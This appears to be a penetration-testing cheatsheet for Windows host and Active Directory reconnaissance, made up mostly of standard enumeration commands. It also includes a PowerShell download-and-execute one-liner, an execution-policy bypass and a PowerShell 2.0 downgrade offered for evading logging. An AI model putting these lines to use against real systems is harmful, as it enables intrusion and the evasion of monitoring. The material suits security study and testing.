## Table of Contents

- [Host & Network Reconnaissance Cheatsheet](#host\&\network\reconnaissance\cheatsheet)
  - [Basic Enumeration Commands](#Basic\Enumeration\Commands)
      - [Systeminfo](#Systeminfo)
  - [Harnessing PowerShell](#Harnessing\PowerShell)
    - [PowerShell Commands](#PowerShell\Commands)
    - [Operational Security with PowerShell](#Operational\Security\with\PowerShell)
    - [Checking Defenses](#Checking\Defenses)
      - [Firewall Checks](#Firewall\Checks)
      - [Windows Defender Check](#Windows\Defender\Check)
    - [Networking Information](#Networking\Information)
    - [Windows Management Instrumentation (WMI)](#Windows\Management\Instrumentation\(WMI))
    - [Net Commands](#Net\Commands)
    - [Domain User Information](#Domain\User\Information)
    - [Dsquery DLL](#Dsquery\DLL)

# Host & Network Reconnaissance Cheatsheet

## Basic Enumeration Commands

Basic commands for initial host and network information gathering:

- `hostname` - Prints the PC's Name.
- `[System.Environment]::OSVersion.Version` - OS version and revision level.
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` - Patches and hotfixes applied to the host.
- `ipconfig /all` - Network adapter state and configurations.
- `set` - Environment variables for the current CMD-prompt session.
- `echo %USERDOMAIN%` - Domain name to which the host belongs.
- `echo %logonserver%` - Domain controller the host checks in with.

#### Systeminfo
- Use `systeminfo` for a comprehensive overview of the system's information.

## Harnessing PowerShell

PowerShell is a powerful scripting language for Windows system and AD environment administration.

### PowerShell Commands

- `Get-Module` - Lists available modules loaded for use.
- `Get-ExecutionPolicy -List` - Execution policy settings for each scope on a host.
- `Set-ExecutionPolicy Bypass -Scope Process` - Temporarily changes policy for the current process.
- `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` - User's PowerShell history.
- `Get-ChildItem Env: | ft Key,Value` - Returns environment values like key paths, users, and computer information.
- `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"` - Example of downloading and executing a file.

### Operational Security with PowerShell

- Downgrading to PowerShell v2.0 can help avoid logging in PowerShell 3.0 and newer versions.
  - `powershell.exe -version 2` - Downgrade PowerShell to version 2.0.

### Checking Defenses

#### Firewall Checks
- `netsh advfirewall show allprofiles` - Displays all firewall profiles.

#### Windows Defender Check
- `sc query windefend` - Checks if Defender is running.
- `Get-MpComputerStatus` - Status and configuration settings of Windows Defender.

### Networking Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists hosts in the arp table.|
|`ipconfig /all`|Adapter settings; network segment identification.|
|`route print`|Displays routing table.|
|`netsh advfirewall show state`|Shows firewall state.|

### Windows Management Instrumentation (WMI)

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Patch level and hotfix descriptions.|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Basic host information.|
|`wmic process list /format:list`|All processes on host.|
|`wmic ntdomain list /format:list`|Domain and Domain Controllers info.|
|`wmic useraccount list /format:list`|Local and domain account info.|
|`wmic group list /format:list`|Local group information.|
|`wmic sysaccount list /format:list`|System account information.|

### Net Commands

- `net accounts` - Information about password requirements.
- `net accounts /domain` - Domain's password and lockout policy.
- `net group /domain` - Lists domain groups.
- `net group "Domain Admins" /domain` - Users with domain admin privileges.
- `net group "domain computers" /domain` - PCs connected to the domain.
- `net group "Domain Controllers" /domain` - Domain controller PC accounts.
- `net localgroup administrators /domain` - Users in the domain's administrators group.
- `net user <ACCOUNT_NAME> /domain` - Information about a domain user.
- `net view` - List of computers in the network.
- `net view /domain` - PCs of the domain.

### Domain User Information
- `net user /domain <username>` - Details about a specific domain user.

### Dsquery DLL
- `dsquery user` - Searches for users.
- `dsquery computer` - Searches for computers.
- `dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"` - Wildcard search in an OU.
- `dsquery * -filter "<LDAP filter>" -attr <attributes>` - Custom LDAP searches.
